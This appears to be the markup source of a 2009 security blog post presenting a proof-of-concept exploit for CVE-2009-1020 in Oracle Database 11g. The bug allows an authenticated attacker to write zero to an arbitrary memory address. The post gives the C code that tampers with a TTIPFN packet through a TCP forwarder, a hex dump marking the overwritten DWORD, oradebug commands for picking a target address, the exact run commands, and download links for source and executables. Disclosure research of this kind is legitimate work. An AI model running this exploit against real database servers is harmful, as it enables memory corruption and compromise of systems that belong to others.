m4_include(`commons.m4')

_HEADER_HL1(`24-Jul-2009: CVE-2009-1020 PoC (CPUjul2009)')

<p><a href="http://blogs.oracle.com/security/2009/07/july_2009_critical_patch_update_released.html">- Vulnerability CVE-2009-1020 receives a CVSS Base Score of 9.0 for Windows, and 6.5 for Unix, Linux, and other platforms. This means that a successful exploitation of the vulnerability can lead to a full compromise of the targeted server at the OS level only on Windows platforms. On other platforms, the scope of the exploitation will be limited to the database layer (i.e. only the database application will be compromised). This vulnerability affects Oracle Database Server 9.2.0.8, 9.2.0.8DV, 10.1.0.5, 10.2.0.4, and 11.1.0.7. —This vulnerability is not remotely exploitable without authentication: The attacker needs to be authenticated to the Database (or use a previously authenticated session) in order to carry on the attack. </a></p>

<p>Here is explanation of vulnerability I did found.</p>

<p>Essentially, it allow attacker to write 0 (32-bit DWORD) at any arbitrary address of Oracle instance process memory.</p>

<p>This PoC tested with 11g Linux only.</p>

<p>It require 11g linux client and 11g linux server, because only in these circumstances we can be sure we modify right byte.
In other circumstances, like another RDBMS versions and OS-es, packet which need be modified will be different slightly.</p>

<p>This PoC consist of two parts: very simple TCP forwarder running in Win32 (of course it can be ported to Linux) and simple program executing SQL statement "select * from v$version", it must be running in Linux x32 box.</p>

<p>TCP forwarder only forwards packets from one address to other, nothing more.</p>
<p>In our case, it is just adapter between RDBMS and "legal" application asking for version.</p>
<p>When TCP forwarder detect TTIPFN packet sent from client to server, it modify it:</p>

<pre>
	      if (buf[0xA]==0x11) // TTIPFN, that's our packet
		{
		  printf ("TTIPFN from client, we modify it.\n");

		  buf[26]=0x9F;
		  
		  buf[84]=pos&0xFF;
		  buf[85]=(pos >> 8)&0xFF;
		  buf[86]=(pos >> 16)&0xFF;
		  buf[87]=(pos >> 24)&0xFF;
		};
</pre>

<p>The packet we need to modify should looks like:</p>

<pre>
0000   00 f9 00 00 06 00 00 00 00 00 11 6b 04 82 00 00  ...........k....
0010   00 2a 00 00 00 01 00 00 00 03 9f 05 71 80 00 00  .*..........q...
0020   00 00 00 00 fe ff ff ff 17 00 00 00 fe ff ff ff  ................
0030   0d 00 00 00 fe ff ff ff fe ff ff ff 00 00 00 00  ................
0040   01 00 00 00 00 28 00 00 00 00 00 00 00 00 00 00  .....(..........
0050   00 00 00 00 34 12 cd ab 00 00 00 00 fe ff ff ff  ....4...........

<p><b>34 12 cd ab</b> here is the DWORD we modify</p>

0060   fe ff ff ff fe ff ff ff 01 00 00 00 00 00 00 00  ................
0070   fe ff ff ff fe ff ff ff 00 00 00 00 00 00 00 00  ................
0080   00 00 00 00 00 00 00 00 00 00 00 00 17 73 65 6c  .............sel
0090   65 63 74 20 2a 20 66 72 6f 6d 20 76 24 76 65 72  ect * from v$ver
00a0   73 69 6f 6e 01 00 00 00 01 00 00 00 00 00 00 00  sion............
00b0   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00c0   01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00d0   00 00 00 00 00 00 00 00 01 01 00 00 00 ff 27 00  ..............'.
00e0   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00f0   00 b2 00 01 00 00 00 00 00                       .........
</pre>

<p><i>pos</i> is the address which we like to write 0 at.</p>

<p>Let's look for some random SGA variable in memory:</p>

<pre>
SQL> oradebug setmypid
Statement processed.

SQL> oradebug dumpsga
Statement processed.

SQL> oradebug dumpvar sga kywmpleq1_e_
sword kywmpleq1_e_ [20001070, 20001074) = 0000014B
</pre>

<p>Now run TCP forwarder on win32 box:</p>

<pre>
tcp_fwd 192.168.0.100 1521 192.168.0.115 1521 0x20001070
</pre>

<p>192.168.0.100 is the address of Win32 box and .115 is the address of 11g server Linux x86.</p>

<p>The last value is the address.</p>

<p>Copy "version" binary to linux box, or copy its source and compile.
This utility login into database as SCOTT, so this account need to be unlocked.</p>

<p>Now run it:</p>
<pre>
export LD_LIBRARY_PATH=$ORACLE_HOME/lib
./version 192.168.0.100/orcl
</pre>
<p>Run "version" executable.</p>

<p>Now let's check SGA variable again:</p>

<pre>
SQL> oradebug dumpvar sga kywmpleq1_e_
sword kywmpleq1_e_ [20001070, 20001074) = 00000000
</pre>

<p>Actually, function ttcpip() writes zero to arbitrary memory location.
Probably, the problem lies in TTC datatypes handling.</p>

<p>Downloads (both source codes + executables):</p>

<p>_HTML_LINK_AS_IS(`http://yurichev.com/non-wiki-files/blog/exploits/oracle/CVE-2009-1020/tcp_fwd.zip')</p>
<p>_HTML_LINK_AS_IS(`http://yurichev.com/non-wiki-files/blog/exploits/oracle/CVE-2009-1020/version_11g.zip')</p>

_BLOG_FOOTER_GITHUB(`23')

_BLOG_FOOTER()

